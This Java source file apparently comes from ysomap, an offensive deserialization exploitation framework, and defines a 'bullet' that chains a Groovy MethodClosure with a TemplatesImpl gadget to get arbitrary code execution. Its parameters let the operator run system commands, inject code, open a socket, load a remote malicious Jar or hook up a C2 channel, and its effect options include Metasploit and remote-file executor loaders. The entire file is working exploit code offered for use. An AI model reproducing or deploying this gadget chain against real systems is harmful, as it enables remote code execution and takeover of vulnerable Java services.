package ysomap.bullets.groovy;

import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Bullets
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Details("任意代码执行")
@Targets({Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class ClosureWithTemplatesImplBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "type", detail = "5种方式（cmd,code,socket,loader,shellcode）:\n" +
            "1. cmd，body写入具体的系统命令；\n" +
            "2. code, body写入具体需要插入执行的代码；\n" +
            "3. socket, body写入`ip:port`\n" +
            "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname` 或 `url;os`\n" +
            "5. c2, body写入C2相关参数，写入格式如 `path` 或 `url`, 具体查看相关 c2 说明 ")
    private String type = "cmd";

    @NotNull
    @Require(name = "body" ,detail = "evil code body")
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、RunClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = TemplatesImplBullet.newInstance(type, body, effect, exception);
        return new MethodClosure(bullet.getObject(), "getOutputProperties");
    }

    public static ClosureWithTemplatesImplBullet newInstance(Object... args) throws Exception {
        ClosureWithTemplatesImplBullet bullet = new ClosureWithTemplatesImplBullet();
        bullet.set("type", args[0]);
        bullet.set("body", args[1]);
        bullet.set("effect", args[2]);
        bullet.set("exception", args[3]);
        return bullet;
    }
}
